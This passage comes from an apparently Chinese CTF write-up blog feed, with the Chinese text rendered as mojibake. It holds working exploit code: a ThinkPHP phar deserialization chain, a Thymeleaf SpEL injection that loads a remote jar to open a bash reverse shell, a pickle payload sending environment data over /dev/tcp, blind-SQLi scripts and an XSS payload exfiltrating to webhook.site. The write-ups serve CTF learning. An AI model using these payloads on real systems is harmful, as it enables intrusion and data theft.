å†™å…¥log,ç„¶åå…ˆç”¨convert.iconv.utf-16le.utf-8è¿‡æ»¤å™¨ï¼Œä½¿å¾—logä¸­åªæœ‰base64-payloadæ˜¯æ­£å¸¸base64å­—ç¬¦é›†å†…çš„ã€‚ç„¶åç”¨convert.base64-decodeå¤„ç†,å°±åªå‰©ä¸‹payloadäº†ã€‚</p><p>ä½†æ˜¯ï¼Œç”±äºæˆ‘ä»¬çš„ç›®çš„æ˜¯å†™å…¥phar.é‡Œé¢å«æœ‰<code>%00</code>.æ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦æ‰¾åˆ°å†™å…¥<code>%00</code>çš„æ–¹æ³•ã€‚æ–¹æ¡ˆå°±æ˜¯ä½¿ç”¨php filterçš„å†…ç½®è¿‡æ»¤å™¨<code>convert.quoted-printable-decode</code>.å®ƒçš„encodeå°±æ˜¯ç¼–ç æˆ<code>={å­—ç¬¦asciiç }</code>,æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°†ç©ºå­—èŠ‚æŒ‰<code>=00</code>å†™å…¥ã€‚</p><p>ç¬¬ä¸€æ­¥æ¸…logçš„è¯ç”¨<a href="https://www.ambionics.io/blog/laravel-debug-rce" target="_blank" rel="noopener">ambionics</a>çš„æ–¹æ³•å°±è¡Œã€‚ç¬¬äºŒæ­¥æˆ‘åœ¨å°è¯•ç›´æ¥ç…§æ¬å¤±è´¥åï¼Œæƒ³åˆ°äº†ä¸å¦‚ç›´æ¥å†™å…¥payloadã€‚ç”±äºè¿™é‡Œfileå‚æ•°æ˜¯getä¼ çš„,æŠ¥é”™å†™åˆ°logé‡Œæ—¶å‚æ•°è¢«urlç¼–ç äº†,æ•´ä¸ªlogé‡Œä¹Ÿä¼šæœ‰ä¸€ä¸ªæˆ‘ä»¬åŸå§‹çš„payload + ä¸€ä¸ªurlç¼–ç åçš„payloadã€‚ä¸è¿‡ç”±äºthinkphpè¿™é‡Œçš„logæŠŠhttpè¯·æ±‚çš„è·¯å¾„å‚æ•°ç­‰éƒ½å¸¦ä¸Šäº†ã€‚æ‰€ä»¥æˆ‘å°±ç›´æ¥socketå‘åŒ…ï¼ŒæŠŠpayloadçš„ä½ç½®æ§åˆ¶åœ¨fileåé¢ï¼Œä¿è¯logé‡Œåªæœ‰ä¸€å¤„payload,ä¸”ä¸ä¼šè¢«ç¼–ç .</p><p>æ•ˆæœï¼š<br><img src="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_9e23d358da6b0e8642299d21b46d3ea5.png" class="lazyload" data-srcset="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_9e23d358da6b0e8642299d21b46d3ea5.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æœ€åä¸€ä¸ªå°é—®é¢˜å°±æ˜¯<code>iconv.utf-16le.utf-8</code>å¤„ç†å†…å®¹éœ€è¦å¶æ•°é•¿åº¦ã€‚è¿™ä¸ªç›´æ¥55å¼€æ¦‚ç‡å¡«å……å­—ç¬¦å°±å¥½äº†(</p><p>exp</p><pre><code class="python"># coding: utf-8# -**- author: byc_404 -**-import requestsimport socketurl = &#39;http://eci-2zeexuk65iew0fq0ohe6.cloudeci1.ichunqiu.com/index.php/hello/1234&#39;host = &#39;eci-2zeexuk65iew0fq0ohe6.cloudeci1.ichunqiu.com&#39;def clear():    r = requests.get(url, params={        &#39;file&#39;: &#39;php://filter/read=consumed/resource=../runtime/log/202105/29.log&#39;    })    print(r.text)def write(payload):    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    sock.connect((host, 80))    sock.send(f&quot;&quot;&quot;GET /index.php/hello/12345?file{payload} HTTP/1.1HOST: eci-2zeexuk65iew0fq0ohe6.cloudeci1.ichunqiu.comUser-Agent: curl/7.64.1&quot;&quot;&quot;.encode())    print(sock.recv(2048))def trigger():    r = requests.get(url, params={        &#39;file&#39;: &#39;php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../runtime/log/202105/29.log&#39;    })    print(r.text)def exp():    r = requests.get(url, params={        &#39;file&#39;: &#39;phar:///var/www/html/runtime/log/202105/29.log&#39;    })    print(r.text)#php poc.php -&gt; phar.phar#cat phar.phar  | base64 -w0 | sed -E &#39;s/=+$//g&#39; | sed -E &#39;s/./\0=00/g&#39;payload = &#39;R=000=00l=00G=00O=00D=00l=00h=00P=00D=009=00w=00a=00H=00A=00g=00X=001=009=00I=00Q=00U=00x=00U=00X=000=00N=00P=00T=00V=00B=00J=00T=00E=00V=00S=00K=00C=00k=007=00I=00D=008=00+=00D=00Q=00p=00x=00A=00Q=00A=00A=00A=00Q=00A=00A=00A=00B=00E=00A=00A=00A=00A=00B=00A=00A=00A=00A=00A=00A=00A=007=00A=00Q=00A=00A=00T=00z=00o=00y=00N=00z=00o=00i=00d=00G=00h=00p=00b=00m=00t=00c=00c=00H=00J=00v=00Y=002=00V=00z=00c=001=00x=00w=00a=00X=00B=00l=00c=001=00x=00X=00a=00W=005=00k=00b=003=00d=00z=00I=00j=00o=00x=00O=00n=00t=00z=00O=00j=00M=000=00O=00i=00I=00A=00d=00G=00h=00p=00b=00m=00t=00c=00c=00H=00J=00v=00Y=002=00V=00z=00c=001=00x=00w=00a=00X=00B=00l=00c=001=00x=00X=00a=00W=005=00k=00b=003=00d=00z=00A=00G=00Z=00p=00b=00G=00V=00z=00I=00j=00t=00h=00O=00j=00E=006=00e=002=00k=006=00M=00D=00t=00P=00O=00j=00E=003=00O=00i=00J=000=00a=00G=00l=00u=00a=001=00x=00t=00b=002=00R=00l=00b=00F=00x=00Q=00a=00X=00Z=00v=00d=00C=00I=006=00N=00D=00p=007=00c=00z=00o=00x=00N=00z=00o=00i=00A=00H=00R=00o=00a=00W=005=00r=00X=00E=001=00v=00Z=00G=00V=00s=00A=00G=00R=00h=00d=00G=00E=00i=00O=002=00E=006=00M=00T=00p=007=00c=00z=00o=002=00O=00i=00I=000=00d=00X=00Q=00x=00N=00W=000=00i=00O=003=00M=006=00O=00T=00o=00i=00d=00G=00F=00j=00I=00C=009=00m=00b=00G=00F=00n=00I=00j=00t=009=00c=00z=00o=00y=00M=00T=00o=00i=00A=00H=00R=00o=00a=00W=005=00r=00X=00E=001=00v=00Z=00G=00V=00s=00A=00H=00d=00p=00d=00G=00h=00B=00d=00H=00R=00y=00I=00j=00t=00h=00O=00j=00E=006=00e=003=00M=006=00N=00j=00o=00i=00N=00H=00V=000=00M=00T=00V=00t=00I=00j=00t=00z=00O=00j=00Y=006=00I=00n=00N=005=00c=003=00R=00l=00b=00S=00I=007=00f=00X=00M=006=00O=00T=00o=00i=00A=00C=00o=00A=00Y=00X=00B=00w=00Z=00W=005=00k=00I=00j=00t=00h=00O=00j=00E=006=00e=003=00M=006=00N=00j=00o=00i=00N=00H=00V=000=00M=00T=00V=00t=00I=00j=00t=00h=00O=00j=00A=006=00e=003=001=009=00c=00z=00o=004=00O=00i=00J=00y=00Z=00W=00x=00h=00d=00G=00l=00v=00b=00i=00I=007=00Y=00T=00o=00x=00O=00n=00t=00p=00O=00j=00A=007=00c=00z=00o=00x=00O=00i=00I=00x=00I=00j=00t=009=00f=00X=001=009=00C=00A=00A=00A=00A=00H=00R=00l=00c=003=00Q=00u=00d=00H=00h=000=00B=00A=00A=00A=00A=00B=003=00y=00s=00W=00A=00E=00A=00A=00A=00A=00D=00H=005=00/=002=00K=00Q=00B=00A=00A=00A=00A=00A=00A=00A=00A=00d=00G=00V=00z=00d=00N=00i=007=00R=00e=00v=00K=00D=00K=002=00M=00E=008=00F=00h=00E=00e=00j=001=00T=00a=00S=00L=00Q=00p=00+=00L=00A=00g=00A=00A=00A=00E=00d=00C=00T=00U=00I=00&#39;clear()write(payload)trigger()exp()</code></pre><p>ç”Ÿæˆtp5.1ååºåˆ—åŒ–åˆ©ç”¨pharçš„poc.php</p><pre><code class="php">&lt;?phpnamespace think;abstract class Model{    private $data = [];    private $withAttr = [];    protected $append = [&#39;byc_404&#39;=&gt;[]];    public function __construct($cmd){        $this-&gt;relation = [&quot;1&quot;];        $this-&gt;data = [&#39;byc_404&#39;=&gt; $cmd];        $this-&gt;withAttr = [&#39;byc_404&#39;=&gt;&#39;system&#39;];    }}namespace think\model;use think\Model;class Pivot extends Model{}namespace think\process\pipes;use think\model\Pivot;class Windows{    private $files = [];    public function __construct($cmd){        $this-&gt;files = [new Pivot($cmd)];    }}$windows = new Windows(&quot;tac /flag&quot;);echo base64_encode(serialize($windows)).&quot;\n&quot;;@unlink(&#39;phar.phar&#39;);$p = new \Phar(&#39;phar.phar&#39;, 0);$p-&gt;startBuffering();$p-&gt;setStub(&#39;GIF89a&#39;.&#39;&lt;?php __HALT_COMPILER(); ?&gt;&#39;);$p-&gt;setMetadata($windows);$p-&gt;addFromString(&#39;test.txt&#39;,&#39;test&#39;);$p-&gt;stopBuffering();?&gt;</code></pre><h2 id="Do-You-Know-Me"><a href="#Do-You-Know-Me" class="headerlink" title="Do_You_Know_Me"></a>Do_You_Know_Me</h2><p>ç¯å¢ƒçœŸçš„å¤ªå¡äº†ã€‚ã€‚ã€‚è€Œä¸”åŸºæœ¬è¿‡äº†10å¤šåˆ†é’Ÿåæ¯æ¬¡è¯·æ±‚å°±ç¨³å®šè¶…æ—¶ã€‚æ²¡æœ‰æºç é»‘ç›’æ‰“å¯¼è‡´è‡³å°‘æ‹–æ²“äº†å‡ å°æ—¶ã€‚ä¸ç„¶è‚¯å®šæ¯”èµ›é‡Œèƒ½å‡ºã€‚</p><p> æ¼æ´å°±æ˜¯ä¸ªthymeleaf çš„ssti,æˆ–è€…è¯´å°±æ˜¯SpEL.å› ä¸ºæ˜¯springbootçš„ç¯å¢ƒï¼Œæ‰€ä»¥è¿˜æ˜¯å¾ˆå¥½æƒ³åˆ°<code>thymeleaf</code>çš„ã€‚å…³é”®è¿˜æ˜¯æ€ä¹ˆç»•waf.</p><p> è¿™é‡Œæµ‹äº†ä¸‹ï¼Œä¼°è®¡wafæœ‰<code>java.lang.*</code>,<code>forName</code>,<code>newInstance</code>,<code>new</code>,<code>toString</code>,runtimexx ç­‰ç­‰ã€‚ä½†æ˜¯URLclassloaderè¿˜åœ¨ã€‚æ‰€ä»¥å¯ä»¥è¿œç¨‹åŠ è½½ç±»</p><p> è¿™é‡Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨SpELçš„ç‰¹æ€§ï¼Œå…³é”®å­—ä¸åŒºåˆ†å¤§å°å†™ï¼Œæ­£å¸¸åˆ›å»ºå¯¹è±¡ã€‚<br> <code>New java.net.URLClassLoader(New java.net.URL[]{New java.net.URL(&quot;http://xxxx/xxx.jar&quot;})</code></p><p> ç´§æ¥ç€å°±é‡åˆ°ç¬¬äºŒä¸ªé—®é¢˜ã€‚æ— æ³•ä½¿ç”¨å­—ç¬¦ä¸²ã€‚è¿™é‡Œå¸¸è§„æ‰‹æ®µ<code>T(java.lang.Character)</code>æ˜¯ä¸è¡Œäº†.äºæ˜¯æˆ‘å»ç¿»äº†ä¸‹thymeleafçš„æ–‡æ¡£ã€‚å‘ç°æœ‰å¾ˆå¤šéå¸¸å¥½ç”¨çš„å†…ç½®variable<br> <a href="https://www.thymeleaf.org/doc/tutorials/2.1/usingthymeleaf.html#appendix-a-expression-basic-objects" target="_blank" rel="noopener">https://www.thymeleaf.org/doc/tutorials/2.1/usingthymeleaf.html#appendix-a-expression-basic-objects</a><br> å½“ç„¶,è¿™äº›web contextæœ‰ä¸€åŠä¹Ÿè¢«banæ‰äº†ã€‚ä½†æ˜¯çœ‹åˆ°ä¸‹é¢çš„<code>httpServletRequest</code>çš„æ–¹æ³•<code>getParameter</code>,åº”è¯¥èƒ½å¤Ÿè¯»å–httpè¯·æ±‚çš„å‚æ•°ã€‚è¿™æ ·æˆ‘ä»¬å°±èƒ½ä¼ å…¥å­—ç¬¦ä¸²äº†ã€‚<br><img src="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_d1055434354fd63d2737bfe442c42e91.png" class="lazyload" data-srcset="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_d1055434354fd63d2737bfe442c42e91.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p> ç„¶åé‡åˆ°ç¬¬ä¸‰ä¸ªé—®é¢˜ã€‚åŸæœ¬æˆ‘æ‰“ç®—è¿œç¨‹åŠ è½½æ¶æ„ç±»,å®ä¾‹åŒ–ç„¶åç›´æ¥å‘½ä»¤æ‰§è¡Œã€‚ç„¶è€Œ<code>newInstance</code>è¢«banäº†ã€‚ã€‚ã€‚ä½†æ˜¯æ¯•ç«Ÿæˆ‘ä»¬ç°åœ¨å¯ä»¥åšåˆ°åŠ è½½ç±»,é‚£ä¹ˆåå°„è°ƒç”¨ä»»æ„æ–¹æ³•æ¥æ‰§è¡Œå‘½ä»¤åº”è¯¥æ²¡æœ‰ä»€ä¹ˆé—®é¢˜ã€‚çœ‹äº†ä¸‹<code>getDeclaredMethod</code>è·Ÿ<code>invoke</code>éƒ½åœ¨ï¼Œè§£å†³æ–¹æ³•å°±æ°´è½çŸ³å‡ºäº†ã€‚</p><p>åˆ›å»ºæ¶æ„ç±»ã€‚æˆ‘ä»¬æŠŠå‘½ä»¤æ‰§è¡Œä»£ç å†™å…¥å…¶é™æ€rceæ–¹æ³•ã€‚</p><pre><code class="java">import java.io.*;public class Evil {    public static void rce() {        try {            String commands[] = {&quot;bash&quot;, &quot;-c&quot;, &quot;bash -i &gt;&amp; /dev/tcp/xxx/9001 0&gt;&amp;1&quot;};            Runtime.getRuntime().exec(commands);        } catch (IOException e) {            e.printStackTrace();        }    }}</code></pre><p>ç¼–è¯‘ç”ŸæˆEvil.jar </p><pre><code class="bash=">javac Evil.javajar cvf Evil.jar Evil.class</code></pre><p> vpsä¸Šç›‘å¬ï¼Œç„¶åæ‰“ä¸€å‘</p><p> <code>New java.net.URLClassLoader(New java.net.URL[]{New java.net.URL(&quot;http://xxxx/xxx.jar&quot;}).getDeclaredMethod(&quot;rce&quot;).invoke(null)</code></p><pre><code class="python"># coding: utf-8# -**- author: byc_404 -**-import requestsurl = &#39;http://eci-2zecj5hgsz4r0xz16uc6.cloudeci1.ichunqiu.com:8888/&#39;def poc():    r = requests.post(url + &#39;search?0=Evil&amp;1=http://120.27.246.202/Evil.jar&amp;2=rce&#39;, data={        &#39;name&#39;: &#39;[[${ New java.net.URLClassLoader(New java.net.URL[]{New java.net.URL(#httpServletRequest.getParameter(1))}).loadClass(#httpServletRequest.getParameter(0)).getDeclaredMethod(#httpServletRequest.getParameter(2)).invoke(null)  }]] &#39;    })    print(r.text)poc()</code></pre><p>åå¼¹shellæˆåŠŸã€‚ç„¶åå‘ç°readflagéœ€è¦rootæƒé™ã€‚çœ‹äº†ä¸‹æ²¡æœ‰å…¶ä»–å¯æ§rootæœåŠ¡ã€‚æ‰€ä»¥<code>find / -user root -perm -4000</code>æ‰¾ä¸‹suid,å‘ç°äº†<code>python2.7</code>æ˜¯æœ‰suidä½çš„ã€‚ç›´æ¥ææƒreadflagå³å¯</p><p> <img src="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_57dfd9f7139ec727d0ebf169e29ff3d8.png" class="lazyload" data-srcset="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_57dfd9f7139ec727d0ebf169e29ff3d8.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p> æ€»çš„è¯´é¢˜ç›®è´¨é‡è¿˜å¯ä»¥ã€‚ä½†æ˜¯ç¯å¢ƒå¾ˆè¿·,æŸç§è§’åº¦ä¸Šæ¥è¯´é¡ºä¾¿å¸®æˆ‘å·©å›ºäº†æ³¢java( </p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> CTF </tag>
            
            <tag> wp </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>angstromCTF 2021</title>
      <link href="2021/04/04/angstromCTF-2021/"/>
      <url>2021/04/04/angstromCTF-2021/</url>
      
        <content type="html"><![CDATA[<p>  æ”¾å‡æ—¶åšäº†ä¸‹ angstromCTFçš„é¢˜ç›®, è´¨é‡éƒ½æŒºä¸é”™çš„ã€‚è¿™é‡Œè®°å½•ä¸‹è‡ªå·±åšå‡ºæ¥çš„é¢˜ç›®ä»¥åŠå¤ç°çš„ã€‚</p><a id="more"></a><p>  (åè§‚æŸå›½å†…æ¯”èµ›æ™ºéšœè„‘æ´é¢˜, çœŸçš„æ— è¯­</p><h2 id="Sea-of-Quills"><a href="#Sea-of-Quills" class="headerlink" title="Sea of Quills"></a>Sea of Quills</h2><p>  é¢˜ç›®ç»™äº†ruby æºç ã€‚ æœ‰å¾ˆæ˜æ˜¾çš„æ³¨å…¥ã€‚</p><pre><code class="ruby">blacklist = [&quot;-&quot;, &quot;/&quot;, &quot;;&quot;, &quot;&#39;&quot;, &quot;\&quot;&quot;]blacklist.each { |word|    if cols.include? word        return &quot;beep boop sqli detected!&quot;    end}if !/^[0-9]+$/.match?(lim) || !/^[0-9]+$/.match?(off)    return &quot;bad, no quills for you!&quot;end@row = db.execute(&quot;select %s from quills limit %s offset %s&quot; % [cols, lim, off])</code></pre><p>åŸºæœ¬æ²¡waf. ç›´æ¥å­æŸ¥è¯¢æŸ¥è¡¨å,å†ä»flagtableæŸ¥flagå³å¯<br><code>col=(select flag from flagtable)</code></p><h2 id="Sea-of-Quills2"><a href="#Sea-of-Quills2" class="headerlink" title="Sea of Quills2"></a>Sea of Quills2</h2><p>ç¬¬äºŒç‰ˆå°±å¾ˆæœ‰æ„æ€äº†ã€‚åŠ ä¸Šäº†çœ‹ä¼¼éå¸¸ä¸¥æ ¼çš„waf. colé•¿åº¦ä¸èƒ½è¶…è¿‡24.limit ä¸offsetéœ€è¦ä¸ºæ•°å­—ã€‚</p><pre><code class="ruby">blacklist = [&quot;-&quot;, &quot;/&quot;, &quot;;&quot;, &quot;&#39;&quot;, &quot;\&quot;&quot;, &quot;flag&quot;]blacklist.each { |word|    if cols.include? word        return &quot;beep boop sqli detected!&quot;    end}if cols.length &gt; 24 || !/^[0-9]+$/.match?(lim) || !/^[0-9]+$/.match?(off)    return &quot;bad, no quills for you!&quot;end@row = db.execute(&quot;select %s from quills limit %s offset %s&quot; % [cols, lim, off])</code></pre><p>è¦çŸ¥é“<code>select*fromsqlite_master</code>æ‰24å­—æ¯ã€‚å°±æ˜¯è¯´å­æŸ¥è¯¢è‚¯å®šä¸å¯è¡Œã€‚é‚£ä¹ˆè¦å¦‚ä½•æ³¨å…¥å‘¢?</p><p>è¿™æ—¶æˆ‘æƒ³èµ·å»å¹´åšè¿‡çš„zer0pts2020 é‡Œçš„urlapp, ä¸€é“åˆ©ç”¨urlæ‰“redis æ”¹é”®åè¯»é”®åçš„é¢˜ç›®ã€‚é‚£é“é¢˜çš„æœ‰è¶£ä¹‹å¤„åœ¨äºä½¿ç”¨<code>BITOP</code>è¿›è¡ŒæŒ‰ä½æ”¹, ç„¶è€Œæ¼æ´æ ¹æºå´æ˜¯ï¼Œrubyæ­£åˆ™çš„è„†å¼±æ€§å¯¼è‡´äº†å¯ä»¥ä¼ å…¥<code>\n</code>bypass æ­£åˆ™, ä»è€ŒSSRF æ‰“ redis.</p><p>æ‰€ä»¥æ­¤å¤„å”¯ä¸€å¯èƒ½ç»•è¿‡çš„åœ°æ–¹è‡ªç„¶æ˜¯limit ä¸offset. å½“æˆ‘fuzz limit ä¼ å…¥<code>\n</code>æ—¶,å‘ç°æ­£åˆ™ç¡®å®è¢«ç»•è¿‡äº†ã€‚è€Œä¸”é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜èƒ½åœ¨<code>\n</code>åä¼ å…¥ä»»æ„å­—ç¬¦è€Œä¸è¢«wafåŒ¹é…åˆ°ã€‚<br>(ä¹‹åäº†è§£åˆ°rubyæ­£åˆ™åªåŒ¹é…å•è¡Œ)</p><p>æ‰€ä»¥å°±æ˜¯ç›²æ³¨çš„äº‹äº†ã€‚æˆ‘ç”¨æ¯”è¾ƒåçˆ±çš„æŠ¥é”™åŒºåˆ†çŠ¶æ€ç æ¥æ³¨å…¥</p><pre><code class="python">import requestsimport stringurl = &#39;https://seaofquills-two.2021.chall.actf.co/&#39;res = &#39;&#39;for j in range(1,100):    print(j)    for i in string.printable:        r = requests.post(url + &#39;quills&#39;, data={            &#39;cols&#39;: &quot;(select 1)&quot;,            &#39;limit&#39;: &quot;2\n or abs(case when(substr((select flag from flagtable limit 1),&quot;+ str(j) +&quot;,1)=&#39;&quot; + i + &quot;&#39;) then -9223372036854775808 else 0 end);&quot;,            &quot;offset&quot;: &quot;3&quot;        })        if r.status_code == 500:            res += i            print(res)            break</code></pre><p>åæ¥æƒ³èµ·æ¥ç›´æ¥union selectå°±è¡Œäº† .. </p><pre><code>cols: &quot;* FROM(select name,desc&quot;limit: &quot;1&quot;offset: &quot;1\n) UNION SELECT flag, 1 FROM flagtable&quot;</code></pre><p>(æ‰€ä»¥è¿™é¢˜zer0pts æ‹¿ä¸€è¡€å¾ˆåˆç† 2333</p><h2 id="Jar"><a href="#Jar" class="headerlink" title="Jar"></a>Jar</h2><p>pickle ååºåˆ—åŒ–ã€‚</p><pre><code class="python">import picklefrom base64 import b64encode as b64class exp(object):        def __reduce__(self):            cmd = [&#39;bash&#39;, &#39;-c&#39;, &#39;echo $(env) &gt; /dev/tcp/xxx/9001 &#39;]            return __import__(&#39;subprocess&#39;).check_output, (cmd,)e = exp()s = pickle.dumps(e)payload = b64(s).decode()url = &#39;https://jar.2021.chall.actf.co/add&#39;r = requests.post(url, cookies={&#39;contents&#39;: payload})print(r.text)</code></pre><h2 id="nomnomnom"><a href="#nomnomnom" class="headerlink" title="nomnomnom"></a>nomnomnom</h2><p>é¢˜ç›®ç»™äº†æºç (ä¸è¿‡ï¼Œè²Œä¼¼ä¸ç»™æºç ä¹Ÿèƒ½åš)ã€‚å¯ä»¥é”å®šå…³é”®ä»£ç å‘ç°è¿™æ˜¯ä¸€é“xssé¢˜ç›®</p><pre><code class="javascript">app.get(&#39;/shares/:shareName&#39;, function(req, res) {    // TODO: better page maybe...? would attract those sweet sweet vcbucks    if (!(req.params.shareName in shares)) {        return res.status(400).send(&#39;hey that share doesn\&#39;t exist... are you a time traveller :O&#39;);    }    const share = shares[req.params.shareName];    const score = share.score;    const name = share.name;    const nonce = crypto.randomBytes(16).toString(&#39;hex&#39;);    let extra = &#39;&#39;;    if (req.cookies.no_this_is_not_the_challenge_go_away === nothisisntthechallenge) {        extra = `deletion token: &lt;code&gt;${process.env.FLAG}&lt;/code&gt;`    }    return res.send(`&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta http-equiv=&#39;Content-Security-Policy&#39; content=&quot;script-src &#39;nonce-${nonce}&#39;&quot;&gt;        &lt;title&gt;snek nomnomnom&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        ${extra}${extra ? &#39;&lt;br /&gt;&lt;br /&gt;&#39; : &#39;&#39;}        &lt;h2&gt;snek goes &lt;em&gt;nomnomnom&lt;/em&gt;&lt;/h2&gt;&lt;br /&gt;        Check out this score of ${score}! &lt;br /&gt;        &lt;a href=&#39;/&#39;&gt;Play!&lt;/a&gt; &lt;button id=&#39;reporter&#39;&gt;Report.&lt;/button&gt; &lt;br /&gt;        &lt;br /&gt;        This score was set by ${name}        &lt;script nonce=&#39;${nonce}&#39;&gt;function report() {    fetch(&#39;/report/${req.params.shareName}&#39;, {        method: &#39;POST&#39;    });}document.getElementById(&#39;reporter&#39;).onclick = () =&gt; { report() };        &lt;/script&gt;     &lt;/body&gt;&lt;/html&gt;`);});app.post(&#39;/report/:shareName&#39;, async function(req, res) {    if (!(req.params.shareName in shares)) {        return res.status(400).send(&#39;hey that share doesn\&#39;t exist... are you a time traveller :O&#39;);    }    await visiter.visit(        nothisisntthechallenge,        `http://localhost:9999/shares/${req.params.shareName}`    );})</code></pre><p>åŒæ—¶æ³¨æ„åˆ°bot  ç”¨åˆ°çš„æ˜¯firefox çš„ puppeteer</p><pre><code class="javascript">async function visit(secret, url) {    const browser = await puppeteer.launch({ args: [&#39;--no-sandbox&#39;], product: &#39;firefox&#39; })    var page = await browser.newPage()    await page.setCookie({        name: &#39;no_this_is_not_the_challenge_go_away&#39;,        value: secret,        domain: &#39;localhost&#39;,        samesite: &#39;strict&#39;    })    await page.goto(url)    // idk, race conditions!!! :D    await new Promise(resolve =&gt; setTimeout(resolve, 500));    await page.close()    await browser.close()}</code></pre><p>ç®€è€Œè¨€ä¹‹ã€‚æˆ‘ä»¬ç°åœ¨å¯æ§<code>shares</code>é¡µé¢ä¸‹ç›´æ¥æ‹¼æ¥çš„scoreä¸name.ä½†æ˜¯é¡µé¢å­˜åœ¨CSP çš„nonce ä¸”nonceä¸ºåŠ¨æ€åˆ·æ–°. æˆ‘ä»¬å¯æ§ç‚¹åœ¨å«nounceçš„script æ­£ä¸Šæ–¹ã€‚</p><p>é¦–å…ˆå¯¹äºè¿™ä¸ªCSP, å…¶å®æ˜¯éå¸¸å¥‡æ€ªçš„ã€‚ä¸€èˆ¬æ¥è¯´è®¾ç½®script-nonce å¯èƒ½ä¼šå…ˆåŠ ä¸Š<code>script-src: &#39;self&#39;</code> <code>default-src: &#39;self&#39;</code> <code>base-uri: none</code> ä¹‹ç±»çš„ã€‚å…¶ä¸­ä¸€ç§ç»•è¿‡æ–¹æ³•æ˜¯åœ¨æ²¡æœ‰<code>base-uri</code>çš„æƒ…å†µä¸‹å…ˆæ’å…¥baseæ ‡ç­¾å†æ’å…¥scipt(å¸¦nonce),è¾¾æˆxss; ä½†æ˜¯è¿™äº›è¦æ±‚nonceå¯æ§ï¼Œæ­¤å¤„è‡ªç„¶æ˜¯ä¸è¡Œçš„ã€‚</p><p>ä½†æ˜¯,æ³¨æ„åˆ°æˆ‘ä»¬å¯æ§çš„nameå°±åœ¨<code>script</code>æ ‡ç­¾æ­£ä¸Šæ–¹ï¼Œä¸€ä¸ªæœ´ç´ çš„æƒ³æ³•è‡ªç„¶æ˜¯ï¼Œæƒ³åŠæ³•è®©æˆ‘ä»¬çš„æ ‡ç­¾æŠŠä¸‹é¢çš„åæ‰ï¼Œå¹¶ä¸”nonce æ­£å¥½å¸¦è¿›å»å°±è¡Œäº†ã€‚<br><code>&lt;script  src=&#39;data:text/plain,alert(1)&#39; a=</code>å½“ç„¶èƒ½åè¿›å»ï¼Œæ­¤æ—¶åœ¨firefoxä¸‹å°±å·²ç»èƒ½xssäº†.ä½†æ˜¯chromeä¸‹å¯ä»¥ä¹ˆï¼Ÿä¸ºäº†é¿å…<code>&lt;</code>å­—ç¬¦çš„å½±å“,è¿™é‡Œæˆ‘å°è¯•äº†ä¸‹è®¾ç½®åŒåå±æ€§ï¼Œå› ä¸ºæµè§ˆå™¨ä¼šå¿½ç•¥ç¬¬äºŒä¸ªåŒåå±æ€§ã€‚ç»“æœå‘ç°chromeä¸‹ç¡®å®è§¦å‘ä¸äº†,å°½ç®¡å·²ç»è§£ææˆæ­£ç¡®çš„ä»£ç äº†</p><p><img src="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_72be679263b1b5f2017fa0b2cf482064.png" class="lazyload" data-srcset="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_72be679263b1b5f2017fa0b2cf482064.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>åŸºäºé¢˜ç›®æ˜¯firefox,ç›´æ¥xssä¼ htmlä»£ç å°±è¡Œã€‚</p><pre><code class="python">def xss():    r = requests.post(url + &#39;record&#39;, json={        &#39;name&#39;: &quot;&quot;&quot;&lt;script src=&quot;data:text/plain,location.href=&#39;https://webhook.site/48cbda29-080e-442f-8040-7a52a9093234/?s&#39;+btoa(document.body.innerHTML)&quot; a=123 a=&quot;&quot;&quot;,        &quot;score&quot;: 44    })    print(r.text)def submit():    r = requests.post(url + &#39;report/376d2d58a518de7b&#39;)    print(r.text)</code></pre><h2 id="Reaction-py"><a href="#Reaction-py" class="headerlink" title="Reaction . py"></a>Reaction . py</h2><p>è¿™é¢˜åƒäº†ä¸ªæ²¡åŸŸåçš„äºã€‚ 